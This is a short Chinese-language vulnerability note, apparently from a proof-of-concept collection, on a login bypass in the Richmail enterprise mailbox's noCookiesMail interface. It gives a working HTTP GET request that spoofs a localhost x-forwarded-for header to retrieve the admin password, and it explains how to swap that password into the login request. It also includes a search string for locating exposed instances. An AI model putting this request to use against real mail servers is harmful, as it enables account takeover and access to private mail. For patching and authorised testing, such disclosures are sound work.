# Richmail 企业邮箱 noCookiesMail 登陆绕过漏洞

## 漏洞描述

Richmail 企业邮箱 noCookiesMail 接口存在登陆绕过漏洞，攻击者通过漏洞可以获取管理员账号密码登录后台

## 漏洞影响

<a-checkbox checked>Richmail 企业邮箱</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"Richmail 企业邮箱"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1698647772423-398a9b02-899e-4fd0-ba4c-e93427ffcaea-20231108125736212.png)

验证POC

```php
GET /RmWeb/noCookiesMail?func=user:getPassword&userMailName=admin HTTP/1.1 
Host:
Cache-Control: max-age=0 
Content-Type: Application/X-www-Form
x-forwarded-for: 127.0.0.1
```

![img](../../../.vuepress/public/img/1698647827407-ee5bc4fd-6790-428a-b56c-9287be10fce7.png)

替换登陆请求中的password字段即可登录